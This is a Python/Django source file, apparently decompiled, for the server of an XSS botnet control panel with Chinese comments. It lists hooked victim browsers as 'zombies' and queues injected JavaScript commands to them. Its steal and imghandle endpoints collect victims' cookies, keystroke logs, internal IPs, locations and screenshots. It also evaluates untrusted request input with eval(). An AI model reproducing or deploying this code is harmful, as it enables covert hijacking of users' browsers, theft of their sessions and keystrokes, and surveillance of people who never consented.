# Embedded file name: C:\lab\w2g\ui\..\ui\cc\views.py
from django.contrib.auth.decorators import login_required
from django.http import HttpResponseRedirect, HttpResponse, Http404
from django.shortcuts import render_to_response, get_object_or_404
from django.core.paginator import Paginator, InvalidPage, EmptyPage
from django.views.generic import list_detail
from django.template import Context, RequestContext, loader
from django.template.loader import get_template
from django.views.generic.simple import direct_to_template, redirect_to
from django.utils import simplejson
from django.db.models import Q
from ui.codz.models import *
from ui.cc.models import *
import time
import hashlib

from django.views.decorators.csrf import csrf_exempt
import os, base64, glob, json


logger = open('debug_log.log', 'a')

def now_time():
    """\xe8\xbf\x94\xe5\x9b\x9e\xe6\x97\xb6\xe9\x97\xb4\xe6\xa0\xbc\xe5\xbc\x8f\xe5\xa6\x82\xef\xbc\x9a2017-03-07 14:30:27"""
    return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))


def to_time(timestr):
    """2017-03-07 14:30:2 -> 1488868227.0"""
    try:
        timestr = str(timestr)
        t = time.strptime(timestr, '%Y-%m-%d %H:%M:%S')
        return time.mktime(t)
    except:
        return time.time()


@login_required
def index(req):
    life_time = 5
    now_sec = time.time()
    life_status = req.GET.get('status', 'all')
    os = req.GET.get('os')
    browser = req.GET.get('browser')
    q = req.GET.get('q')
    q_type = req.GET.get('q_type', 'title').lower()
    if q:
        if q_type == 'title':
            zombies = Zombies.objects.filter(title__icontains=q).order_by('-id')
        elif q_type == 'location':
            zombies = Zombies.objects.filter(location__icontains=q).order_by('-id')
    else:
        zombies = Zombies.objects.order_by('-id')
    oss = []
    browsers = []
    for z in zombies:
        z_details = ZombiesDetail.objects.filter(uid=z.uid).order_by('-time')
        innerip = ''
        for z_d in z_details:
            if z_d.type == 'innerip':
                innerip = z_d.info
                if innerip:
                    break

        z.innerip = innerip
        if z.browser and z.browser not in browsers:
            browsers.append(z.browser)
        if z.os and z.os not in oss:
            oss.append(z.os)
        if z.status == 0:
            z.status = 1
            z.save()
        up_sec = to_time(z.up_time)
        if now_sec - up_sec <= life_time:
            z.life_status = 'live'
        else:
            z.life_status = 'dead'
        shadows_count = ZombiesShadow.objects.filter(uid=z.uid).count()
        z.shadows_count = shadows_count

    zombies_filter_os = []
    for z in zombies:
        if os:
            if os == z.os:
                zombies_filter_os.append(z)
        else:
            zombies_filter_os.append(z)

    zombies_filter_browser = []
    for z in zombies_filter_os:
        if browser:
            if browser.lower() in z.browser.lower():
                zombies_filter_browser.append(z)
        else:
            zombies_filter_browser.append(z)

    zombies_filter_live = []
    zombies_filter_dead = []
    for z in zombies_filter_browser:
        if z.life_status == 'live':
            zombies_filter_live.append(z)
        else:
            zombies_filter_dead.append(z)

    zombies_filtered = []
    if life_status == 'live':
        zombies_filtered = zombies_filter_live
    elif life_status == 'dead':
        zombies_filtered = zombies_filter_dead
    else:
        zombies_filtered = zombies_filter_browser
    codz_list = Codz.objects.filter(type='system')
    zombies_filtered = sorted(zombies_filtered,
                              key=lambda a: a.life_status, reverse=True)
    return list_detail.object_list(req, queryset=zombies, template_name='cc/index.html', template_object_name='zombie', extra_context={'codz_list': codz_list,
     'zombie_list': zombies_filtered,
     'oss': oss,
     'browsers': browsers,
     'zombies_count': len(zombies),
     'zombies_live_count': len(zombies_filter_live),
     'zombies_dead_count': len(zombies_filter_dead)})


@login_required
def lastest_zombies(req):
    """\xe6\x96\xb0\xe4\xb8\x8a\xe7\xba\xbf\xe7\x9a\x84zombie\xef\xbc\x88\xe5\x8c\x85\xe6\x8b\xac\xe9\x82\xa3\xe4\xba\x9b\xe5\xa4\x8d\xe6\xb4\xbb\xe7\x9a\x84\xef\xbc\x89"""
    result = {}
    zombies = Zombies.objects.filter(status=0).order_by('-id')
    result['count'] = len(zombies)
    z_ids = []
    for z in zombies:
        z_ids.append(z.id)

    result['ids'] = z_ids
    response = HttpResponse(simplejson.dumps(result, ensure_ascii=False), mimetype='application/json')
    response['Expires'] = 'Mon, 26 Jul 1997 05:00:00 GMT'
    response['Last-Modified'] = 'Mon, 26 Jul 1997 05:00:00 GMT'
    response['Cache-Control'] = 'no-cache, must-revalidate'
    response['Pragma'] = 'no-cache'
    return response


@login_required
def injxss(req):
    """\xe6\xb3\xa8\xe5\x85\xa5XSS\xe6\x8c\x87\xe4\xbb\xa4\xe7\xbb\x99\xe9\x80\x89\xe5\xae\x9a\xe7\x9a\x84zombie"""
    exp = req.POST.get('exp')
    codz_select = req.POST.get('codz_select')
    all_zombie_check = req.POST.get('all_zombie_check')
    zombie_ids = req.POST.get('zombie_ids', '')
    start_time = req.POST.get('start_time')
    now = now_time()
    if not exp:
        info = 'error: \xe6\x9c\xaa\xe5\xa1\xab\xe5\x86\x99\xe5\x88\xa9\xe7\x94\xa8\xe4\xbb\xa3\xe7\xa0\x81...'
        return HttpResponse(simplejson.dumps({'success': 0,
         'info': info}, ensure_ascii=False), mimetype='application/json')
    if all_zombie_check == '0' and not zombie_ids:
        info = u'error: \u6ca1\u9009\u62e9\u50f5\u5c38\u7528\u6237...'
        return HttpResponse(simplejson.dumps({'success': 0,
         'info': info}, ensure_ascii=False), mimetype='application/json')
    zombie_ids = zombie_ids.split(',')
    if all_zombie_check and all_zombie_check != '0':
        zombies = Zombies.objects.all()
        if not zombies:
            info = u'\u65e0\u50f5\u5c38\u7528\u6237\u53ef\u63a7\u5236...'
            return HttpResponse(simplejson.dumps({'success': 0,
             'info': info}, ensure_ascii=False), mimetype='application/json')
        for zombie in zombies:
            zombie_cmd = ZombiesCmd()
            zombie_cmd.uid = zombie.uid
            zombie_cmd.group = zombie.group
            zombie_cmd.cmd = exp
            zombie_cmd.attack_time = start_time
            zombie_cmd.add_time = now
            zombie_cmd.status = 0
            zombie_cmd.save()

    else:
        for zombie_id in zombie_ids:
            zombie = Zombies.objects.get(id=zombie_id)
            zombie_cmd = ZombiesCmd()
            zombie_cmd.uid = zombie.uid
            zombie_cmd.group = zombie.group
            zombie_cmd.cmd = exp
            zombie_cmd.attack_time = start_time
            zombie_cmd.add_time = now
            zombie_cmd.status = 0
            zombie_cmd.save()

    info = u'\u6307\u4ee4\u8f93\u51fa\u6210\u529f...'
    return HttpResponse(simplejson.dumps({'success': 1,
     'info': info}, ensure_ascii=False), mimetype='application/json')


@login_required
def desczombie(req):
    """\xe7\xbb\x99zombie\xe6\xb7\xbb\xe5\x8a\xa0\xe5\xa4\x87\xe6\xb3\xa8\xe4\xbf\xa1\xe6\x81\xaf"""
    _id = req.POST.get('id', 0)
    desc = req.POST.get('desc', '')
    if not _id:
        raise Http404()
    if not desc:
        info = u'\u8bf7\u8f93\u5165\u5907\u6ce8\u5185\u5bb9...'
        return HttpResponse(simplejson.dumps({'success': 0,
         'info': info}, ensure_ascii=False), mimetype='application/json')
    try:
        zombie = Zombies.objects.get(id=_id)
        zombie.desc = desc
        zombie.save()
        info = u'\u5907\u6ce8\u7f16\u8f91\u6210\u529f...'
        return HttpResponse(simplejson.dumps({'success': 1,
         'info': info}, ensure_ascii=False), mimetype='application/json')
    except:
        info = u'\u5907\u6ce8\u7f16\u8f91\u5931\u8d25...'
        return HttpResponse(simplejson.dumps({'success': 0,
         'info': info}, ensure_ascii=False), mimetype='application/json')


def newzombie(req, now):
    """\xe6\xb7\xbb\xe5\x8a\xa0\xe4\xb8\x80\xe4\xb8\xaa\xe7\x9c\x9f\xe8\xba\xab\xef\xbc\x9a\xe6\xb0\xb4\xe5\x8d\xb0\xe8\xbf\x9b\xe8\xa1\x8c\xe5\x8c\xba\xe5\x88\x86"""
    info = req.GET.get('i')
    info = eval(info, {})
    domain = info.get('domain', '')
    ip, ua = get_client_info(req)
    token = get_zombie_token(domain, ip, ua)
    if len(info) > 1:
        _uid = info.get('id')
        # if len(_uid) >= 15:
        #     uid = hashlib.md5(_uid).hexdigest()
        # else:
        #     uid = token
        uid = token
        _uid = token
        browser_info = info.get('browser', {})
        browser_name = browser_info.get('name', '')
        browser_version = browser_info.get('version', '')
        referer = info.get('referrer', '')
        location = info.get('location', '')
        toplocation = info.get('toplocation', '')
        cookie = info.get('cookie', '')
        title = info.get('title', '')

        #增加的字段
        local_time = info.get('local_time', '')
        screen = info.get('screen', '')
        memory = info.get('memory', '')
        cpu_cores = info.get('cpu_cores', '')

        if 'win' in ua.lower():
            os = 'windows'
        elif 'linux' in ua.lower():
            os = 'linux'
        elif 'mac' in ua.lower():
            os = 'mac'
        elif 'iphone' in ua.lower():
            os = 'iphone'
        else:
            os = 'unknown'
        zombie_exist = Zombies.objects.filter(uid=uid)
        if not zombie_exist:
            zombie = Zombies()
            zombie.uid = uid
            zombie.utmwg = _uid
            zombie.born_time = now
            zombie.status = 0
        else:
            zombie = Zombies.objects.get(uid=uid)
            now_sec = time.time()
            up_sec = to_time(zombie.up_time)
            if now_sec - up_sec >= 30:
                zombie.status = 0
        zombie.group = domain
        if os:
            zombie.os = os
        if browser_name or browser_version:
            zombie.browser = browser_name + ' ' + browser_version
        if title:
            zombie.title = title
        if ua:
            zombie.user_agent = ua
        if referer:
            zombie.referer = referer
        if location:
            zombie.location = location
        if ip:
            zombie.ip = ip
        if cookie:
            zombie.cookie = cookie
        zombie.up_time = now

        zombie.local_time = local_time
        zombie.screen = screen
        zombie.cpu_cores = cpu_cores
        zombie.memory = memory

        zombie.save()
        return uid
    else:
        return 0


def newzombie_shadow(uid, req, now):
    """\xe6\xb7\xbb\xe5\x8a\xa0\xe4\xb8\x80\xe4\xb8\xaa\xe5\xbd\xb1\xe5\xad\x90\xef\xbc\x9a\xe4\xb8\x8e\xe7\x9c\x9f\xe8\xba\xab\xe6\x98\xaf\xe5\xa4\x9a\xe5\xaf\xb9\xe4\xb8\x80\xe5\x85\xb3\xe7\xb3\xbb\xef\xbc\x8c\xe6\xb5\x8f\xe8\xa7\x88\xe5\x99\xa8\xe8\xbf\x9b\xe8\xa1\x8c\xe5\x8c\xba\xe5\x88\x86"""
    info = req.GET.get('i')
    info = eval(info, {})
    domain = info.get('domain', '')
    ip, ua = get_client_info(req)
    token = get_zombie_token(domain, ip, ua)
    browser_info = info.get('browser', {})
    browser_name = browser_info.get('name', '')
    browser_version = browser_info.get('version', '')
    cookie = info.get('cookie', '')
    zombie_shadow_exist = ZombiesShadow.objects.filter(uid=uid, sid=token)
    if not zombie_shadow_exist:
        zombie_shadow = ZombiesShadow()
        zombie_shadow.uid = uid
        zombie_shadow.sid = token
        zombie_shadow.born_time = now
    else:
        zombie_shadow = ZombiesShadow.objects.get(uid=uid, sid=token)
    zombie_shadow.group = domain
    zombie_shadow.browser = browser_name + ' ' + browser_version
    zombie_shadow.user_agent = ua
    zombie_shadow.ip = ip
    zombie_shadow.cookie = cookie
    zombie_shadow.up_time = now
    zombie_shadow.save()


def rtcmd(req):
    """\xe5\xae\x9e\xe6\x97\xb6\xe5\x91\xbd\xe4\xbb\xa4"""
    now = now_time()
    uid = newzombie(req, now)
    if not uid:
        return HttpResponse('')
    newzombie_shadow(uid, req, now)
    zombie_cmds = ZombiesCmd.objects.filter(uid=uid, status=0).order_by('id')
    r = ''
    for zombie_cmd in zombie_cmds:
        r = zombie_cmd.cmd
        zombie_cmd.status = 1
        zombie_cmd.save()
        break

    response = HttpResponse(r)
    response['Expires'] = 'Mon, 26 Jul 1997 05:00:00 GMT'
    response['Last-Modified'] = 'Mon, 26 Jul 1997 05:00:00 GMT'
    response['Cache-Control'] = 'no-cache, must-revalidate'
    response['Pragma'] = 'no-cache'
    response["Access-Control-Allow-Origin"] = "*"
    response["Access-Control-Allow-Methods"] = "POST, GET"
    response["Access-Control-Allow-Headers"] = "*"
    
    return response


def get_client_info(req):
    """\xe8\x8e\xb7\xe5\x8f\x96\xe5\xae\xa2\xe6\x88\xb7\xe7\xab\xaf\xe5\x9f\xba\xe6\x9c\xac\xe4\xbf\xa1\xe6\x81\xaf\xef\xbc\x9aip,user_agent"""
    meta = req.META
    ip = meta.get('REMOTE_ADDR', '')
    ua = meta.get('HTTP_USER_AGENT', '')
    return (ip, ua)


def get_zombie_token(domain, ip, ua):
    """\xe8\x8e\xb7\xe5\x8f\x96\xe8\xa2\xab\xe6\x94\xbb\xe5\x87\xbb\xe8\x80\x85\xe5\x94\xaf\xe4\xb8\x80\xe8\xba\xab\xe4\xbb\xbd\xe6\xa0\x87\xe5\xbf\x97"""
    md5 = hashlib.md5(str(domain) + str(ip) + str(ua)).hexdigest()
    return md5


@login_required
def delzombie(req):
    xids = req.REQUEST.get('ids', '')
    if not xids:
        info = 'Nothing to be deleted'
        return HttpResponse(simplejson.dumps({'success': 0,
         'info': info}, ensure_ascii=False), mimetype='application/json')
    try:
        xid_list = xids.split(',')
        xid_list = [ xid.strip() for xid in xid_list if xid.strip() ]
        for xid in xid_list:
            x = Zombies.objects.get(id=xid)
            uid = x.uid
            x.delete()
            z_shadows = ZombiesShadow.objects.filter(uid=uid)
            for i in z_shadows:
                i.delete()

            z_cmds = ZombiesCmd.objects.filter(uid=uid)
            for i in z_cmds:
                i.delete()

            z_details = ZombiesDetail.objects.filter(uid=uid)
            for i in z_details:
                i.delete()

        info = 'Delete zombie success'
        return HttpResponse(simplejson.dumps({'success': 1,
         'info': info}, ensure_ascii=False), mimetype='application/json')
    except Exception as e:
        info = 'Delete zombie failure'
        return HttpResponse(simplejson.dumps({'success': 0,
         'info': info}, ensure_ascii=False), mimetype='application/json')


@login_required
def report(req, zombie_id, template):
    try:
        zombie_id = int(zombie_id)
    except ValueError:
        raise Http404()

    try:
        z = Zombies.objects.get(id=zombie_id)
    except ValueError:
        raise Http404()

    z_shadows = ZombiesShadow.objects.filter(uid=z.uid)
    z_details = ZombiesDetail.objects.filter(uid=z.uid).order_by('time')
    z_detail_dict = {}

    #new code [start]
    imgpath = os.path.join(os.getcwd(), "statics/screenshot/")
    z_screenshots = glob.glob(imgpath+z.uid+"*")
    z_screenshots = [os.path.basename(x) for x in z_screenshots]
    #new code [end]

    for z_d in z_details:
        if z_d.type not in z_detail_dict:
            z_detail_dict[z_d.type] = []
        z_detail_dict[z_d.type].append(z_d)

    result = {'zombie': z,
     'zombie_shadows': z_shadows,
     'zombie_detail': z_detail_dict,
     'zombie_screenshots': z_screenshots
     }
    return render_to_response(template, result)


def steal(req):
    info = req.REQUEST.get('info')
    domain = req.REQUEST.get('domain', '')
    _uid = req.REQUEST.get('id', 0)
    print req
    if not info or not domain or not _uid:
        return HttpResponse(0)
    ip, ua = get_client_info(req)
    token = get_zombie_token(domain, ip, ua)
    # if len(_uid) >= 15:
    #     uid = hashlib.md5(_uid).hexdigest()
    # else:
    #     uid = token
    uid = token
    try:
        _typeint = int(req.REQUEST.get('type'))
    except:
        _typeint = 99
    print _typeint
    _typedict = {1: 'keylog',
     2: 'port',
     3: 'ping',
     4: 'innerip',
     5: 'isp',
     6: 'position',
     99: 'cosine'}
    try:
        _type = _typedict[_typeint]
    except:
        _type = _typedict[99]

    zombie_detail = ZombiesDetail()
    zombie_detail.uid = uid
    zombie_detail.group = domain
    zombie_detail.info = info
    zombie_detail.type = _type
    zombie_detail.time = now_time()
    # print zombie_detail
    zombie_detail.save()

    return HttpResponse(1)

def testpage(req):
    return render_to_response('testpage.html')

@csrf_exempt
def imghandle(req):
    if req.POST:
        data = json.loads(req.raw_post_data)
        try:
            _uid = data['id']
            domain = data['domain']
            print req
            if not domain or not _uid:
                return HttpResponse(0)
            ip, ua = get_client_info(req)
            token = get_zombie_token(domain, ip, ua)
            uid = token
        except:
            print "get token fail"

        b64data = data['imgdata'].split(',')[1]
        imgdata = base64.b64decode(b64data)
        imgfile = uid + "_" + str(time.time()) + ".jpg"
        fpath = os.path.join(os.getcwd(), "statics/screenshot/",imgfile)
        with open(fpath, "wb") as f:
            f.write(imgdata)






    